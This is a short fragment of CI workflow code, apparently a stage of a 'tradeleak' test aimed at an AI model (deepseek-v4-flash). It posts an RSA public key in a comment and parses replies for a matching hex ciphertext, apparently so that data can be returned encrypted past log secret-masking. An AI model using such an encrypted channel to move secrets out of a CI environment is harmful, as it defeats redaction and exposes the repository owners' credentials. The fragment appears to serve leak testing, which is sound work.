...
ROOT="$(mktemp -d /tmp/tl5-XXXXXX)"; PRIV="$ROOT/private.pem"; PUB="$ROOT/public.pem"; CHEX="$ROOT/c.hex"; CBIN="$ROOT/c.bin"; KEYF="$ROOT/key"; RESULTS="$GITHUB_WORKSPACE/tradeleak_stage5_output"; mkdir -p "$RESULTS"; rm -rf "$RESULTS"/*
...
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out "$PRIV" 2>/dev/null;openssl pkey -in "$PRIV" -pubout -out "$PUB";{ echo TRADELEAK_STAGE5_PUBLIC_KEY_V2;echo "nonce=$NONCE";echo "run_id=$GITHUB_RUN_ID";echo requested_model=deepseek-v4-flash;echo "ata_commit=$ATA_COMMIT";echo TRADELEAK_STAGE5_PUBLIC_KEY_BEGIN;cat "$PUB";echo TRADELEAK_STAGE5_PUBLIC_KEY_END;} > "$ROOT/pub";comment "$ROOT/pub"
...
import json,re,sys
src,nonce,out,cid=sys.argv[1:];xs=json.load(open(src));p=re.compile(r'TRADELEAK_STAGE5_CIPHERTEXT_HEX_V2\s*\nnonce='+re.escape(nonce)+r'\s*\nTRADELEAK_STAGE5_CIPHERTEXT_HEX_BEGIN\s*\n([0-9a-fA-F\s]+?)\nTRADELEAK_STAGE5_CIPHERTEXT_HEX_END',re.S)
